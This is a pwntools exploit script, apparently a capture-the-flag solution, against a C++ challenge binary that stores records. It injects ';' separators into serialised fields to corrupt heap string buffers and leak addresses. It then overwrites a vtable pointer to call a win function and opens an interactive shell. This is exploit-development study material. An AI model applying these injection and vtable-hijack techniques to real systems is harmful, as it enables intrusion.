#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

libc = ELF('libc.so.6')

HOST = '172.17.0.1' # change to remote, this is for testing in Docker containers
PORT = 24020

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
context.terminal = '/usr/bin/true'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return remote(HOST, PORT)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break chall.cpp:369
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

created = 0

SEP = b';'

def select_mode(mode: int):
    io.sendlineafter(b'Enter mode (1 ~ 8): ', str(mode).encode())

def enter_field(field: str, val: bytes):
    io.sendlineafter(b'Enter ' + field.encode(), val)

def new_pal(name: bytes, age: int, gender: bytes, type: int):
    select_mode(2)
    enter_field('Name', name)
    enter_field('Age', str(age).encode())
    io.sendlineafter(b'Enter Gender (M/F/?): ', gender)
    enter_field('type', str(type).encode())
    global created
    created += 1

def new_human(name: bytes, age: int, gender: bytes, occupation: bytes):
    select_mode(1)
    enter_field('Name', name)
    enter_field('Age', str(age).encode())
    io.sendlineafter(b'Enter Gender (M/F/?): ', gender)
    enter_field('Occupation', occupation)
    global created
    created += 1

def human_buf(id: int, name: bytes, age: int, gender: str, hp: int, occupation: bytes) -> bytes:
    GENDER_MAP = {
        'M': 0,
        'F': 1,
        '?': 2,
    }
    gender_id = GENDER_MAP.get(gender)
    if gender_id is None:
        raise Exception("Invalid gender!")
    return SEP.join([b'5Human', str(id).encode(), name, str(age).encode(), str(gender_id).encode(), str(hp).encode(), occupation]) + SEP

def save():
    select_mode(4)

def load(id: int):
    select_mode(5)
    io.sendlineafter(b'Enter Save Number', str(id).encode())

def show():
    select_mode(3)

# -exec p &((Human)*things[0]).occupation[0]
# $6 = (__gnu_cxx::__alloc_traits<std::allocator<char>, char>::value_type *) 0x55be14231680 "F1 Driver"
# &things[1]->name._M_dataplus._M_p: 0x55be142316d0 <-- Pointer at 16d0
# -exec p things[1]->name.c_str()
# $9 = 0x55be142316e0 "Alonso" <-- Buffer is at 16e0
# distance (str buffer -> buffer)
# diff = 0x50 # 0x16d0 - 0x1680
# new_human("A-san", 12, 'M', human_buf(1, "payload", 2, 'M', 100, flat(b'A'*(diff-0x4), pack(2, 32), b'\0'))) # Poison buf ptr `name` of the following human to the pointer itself, and leak address
# save()
# new_human('B'*15, 14, 'F', 'Hecker') # 15 characters is the longest len that will be stored in str structure
# load(1)

# Poison buffer internally to get a leak:
# Overflow in structure buffer of name to ptr to buffer of occupation of human
# Since our payload might be longer than 15 bytes, we poison a new Person
DIST = 0x20
new_human(b"A-san", 12, b'M', SEP + human_buf(7, cyclic(DIST), 22, 'M', 100, b'')) # Must be nothing, since occupation buf ptr is set to itself and having something will overwrite it
save()
new_pal(b'Cattiva', 7, b'F', 1)
new_pal(b'Pika', 7, b'?', 1)
new_pal(b'LoLa', 7, b'?', 1)
new_pal(b'MaMa', 7, b'?', 1)
new_pal(b'HaHa', 7, b'?', 1)
new_human(b'B-san', 14, b'F', b'A'*15) # 15 characters is the longest len that will be stored in str structure
# new_human(b'C-san', 32, b'F', b'A'*15) # 15 characters is the longest len that will be stored in str structure
load(1)
show() # 7 entries
# Capture a heap address. The address is the address of the ptr of name.
out: bytes = io.recvuntil(b'Choose your operation', drop=True)
leak_start_idx = out.rfind(b'Occupation: ')+len(b'Occupation: ')
leak_haystack = out[leak_start_idx:leak_start_idx+15]
# according to testing, the leak should be in the first 8 bytes
heap_addr = unpack(leak_haystack[:8])
info(f'Got leak: {hex(heap_addr)}')
assert(heap_addr & 0xff == 0x0)

# # Get libc address
# select_mode(8)
# setbuf_addr = int(io.recvline_startswith(b'setbuf').split(b' ')[1], base=16)
# libc.address = setbuf_addr - libc.sym['setbuf']
# assert(libc.address & 0xFFF == 0)
# info(f'libc: {hex(libc.address)}')

# Get libc address
select_mode(8)
main_addr = int(io.recvline_startswith(b'main').split(b' ')[1], base=16)
exe.address = main_addr - exe.sym['main']
assert(exe.address & 0xFFF == 0)
info(f'exe: {hex(exe.address)}')

# Overflow into an entry directly following it, overwriting the vtable ptr of the next entry.
# The new vtable will point to the magic address
# Algo: Create 3 humans: one to set the payload, one to overwrite from, and one to overwrite into
# The two entries to overwrite from and to should be close
ENTRY_SEP = 0x10
# HEAP_LEAK_OFFSET = 0x560  #don't know, the address of the leak --> addr of magic address
HEAP_LEAK_OFFSET = 0x1c0  #don't know, the address of the leak --> addr of magic address
# info(f'Using libc one_gadget at {hex(libc.address + MAGIC)} (offset {hex(MAGIC)})')
assert(b'\0' not in pack(heap_addr + HEAP_LEAK_OFFSET)[:6])
new_human(b'hecker', 23, b'M', SEP + human_buf(created+5, b'C-san', 23, 'M', 100, flat(b'B'*16, b'B'*ENTRY_SEP, heap_addr + HEAP_LEAK_OFFSET)))
save()
new_human(b'?', 14, b'F', flat(exe.sym['_Z3winv'])) # 15 characters is the longest len that will be stored in str structure
new_human(b'?', 14, b'F', b'A'*15) # 15 characters is the longest len that will be stored in str structure
new_human(b'?', 14, b'F', b'A'*15) # 15 characters is the longest len that will be stored in str structure
new_human(b'C-san', 14, b'F', b'A'*15) # 15 characters is the longest len that will be stored in str structure
new_human(b'D-san', 14, b'F', b'A'*15) # 15 characters is the longest len that will be stored in str structure
load(2)
show()

io.interactive()

